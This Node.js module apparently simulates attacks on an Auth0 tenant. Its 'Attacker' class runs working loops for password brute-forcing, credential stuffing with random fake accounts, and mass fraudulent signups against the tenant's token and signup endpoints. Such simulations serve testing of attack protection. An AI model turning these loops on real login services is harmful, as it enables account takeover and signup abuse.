const axios = require('axios')
const chalk = require('chalk')

class Attacker {
  constructor ({ connection, tenant, client }) {
    this._connection = connection
    this._tenant = tenant
    this._client = client
  }

  get connection () { return this._connection }
  get tenant () { return this._tenant }
  get client () { return this._client }
  get URL () { return `https://${process.env.AUTH0_DOMAIN}` }

  /**
   * Randomly generate an email address
   */
  static generateEmail () {
    const addresses = [
      'funny',
      'phoney',
      'munny',
      'stealth',
      'user',
      'fake',
      'not-real',
      'unreal',
      'psuedo',
      'dude',
      'dudette',
      'thor',
      'wonder',
      'blunder',
      'prof',
      'nob',
      'n00b',
      'crypto',
      'genius',
      'guy',
      'gal',
      'new',
      'old',
      'hot',
      'cold'
    ]
    const domains = [ 'org', 'ru', 'eu', 'edu', 'ca', 'com' ]
    
    const i = Math.floor(Math.random() * addresses.length)
    const j = Math.floor(Math.random() * addresses.length)
    const k = Math.floor(Math.random() * addresses.length)
    const l = Math.floor(Math.random() * domains.length)

    return `${addresses[i]}.${addresses[j]}@${addresses[k]}.${domains[l]}`
  }

  /**
   * Randomly generate a password with the given strength and length
   * 
   * @param {object} param
   * @param {string} param.strength A string describing the password strength
   * @param {number} param.length   The minimum number of characters of the password
   */
  static generatePassword ({ strength = 'good', length = 8 }) {
    /*
    TODO: make sure password strength is sufficient
    
    */
    const alpha = 'abcdefghijklmnopqrstuvwxyz'
    const chars = '!@#$%^&*'
    const lengthVariation = Math.floor(Math.random() * 4)
    let password = []
    for (let idx = 0; idx < length - 2 + lengthVariation; idx++) {
      password[idx] = alpha[Math.floor(Math.random() * alpha.length)]
      if (idx > length / 2) {
        password[password.length - 1] = password[password.length - 1].toUpperCase()
      }
    }
    password[password.length] = chars[Math.floor(Math.random() * chars.length)]
    password[password.length] = chars[Math.floor(Math.random() * chars.length)]

    shuffle(password)
    return password.join('')

    // Fisher-Yates Shuffle algorithm
    // See ... https://bost.ocks.org/mike/shuffle/
    function shuffle(array) {
      let m = array.length
      let t
      let i
      while (m) {
        i = Math.floor(Math.random() * m--)
        t = array[m]
        array[m] = array[i]
        array[i] = t
      }
    }
  }

  async attemptLogin (email, password) {
    try {
      // SEE docs on "realm support"
      // https://auth0.com/docs/get-started/authentication-and-authorization-flow/call-your-api-using-resource-owner-password-flow#configure-realm-support
      const params = new URLSearchParams()
      params.append('username', email)
      params.append('password', password)
      params.append('realm', this.connection.name)
      params.append('client_id', this.client.client_id)
      params.append('grant_type', 'http://auth0.com/oauth/grant-type/password-realm')
      params.append('scope', 'profile')

      const headers = {
        'content-type': 'application/x-www-form-urlencoded'
      }
      const response = await axios.post(`${this.URL}/oauth/token`, params, { headers })

      return response.status
    } catch (error) {
      // console.log(error.message)
      return error.response?.status
    }
  }

  async attemptSignup (email, password) {
    try {
      const body = {
        email,
        password,
        connection: this.connection.name,
        client_id: this.client.client_id
      }
      const config = {
        headers: {
          'content-type': 'application/json'
        }
      }
      const response = await axios.post(`${this.URL}/dbconnections/signup`, JSON.stringify(body), config)
      return response.status;
    } catch (error) {
      return error.response.status
    }
  }

  async bruteForce ({ email, attempts }) {
    for (let i = 0; i < attempts; i++) {
      const password = `P@ssw0rd${i}!`
      const status = await this.attemptLogin(email, password)
      console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
    }
  }

  async credentialStuffing ({ attempts }) {
    for (let i = 0; i < attempts; i++) {
      const email = Attacker.generateEmail()
      const password = Attacker.generatePassword({
        strength: this.connection?.options?.password_policy || 'good',
        length: this.connection?.options?.password_complexity_options?.min_length || 8
      })
      const status = await this.attemptLogin(email, password)
      console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
    }
  }

  async fraudulentSignups ({ count }) {
    for (let i = 0; i < count; i++) {
      const email = `fraud.user${i + 10}@auth0.com`
      const password = `P@ssw0rd!`
      const status = await this.attemptSignup(email, password)
      console.log(`attempt #${i + 1} - email= ${chalk.blueBright(email)}, PW= ${chalk.blueBright(password)}: ${this.prettifyResponse(status)}`)
    }
  }

  prettifyResponse (status) {
    let colorized = chalk.black.bgYellow('UNKNOWN');
    if (status > 399 && status < 500) {
      colorized = chalk.black.bgRed('FAILURE');
    } else if (status === 200) {
      colorized = chalk.black.bgGreen('SUCCESS');
    }
    return `[${status}] ${colorized}`
  }
}

module.exports = Attacker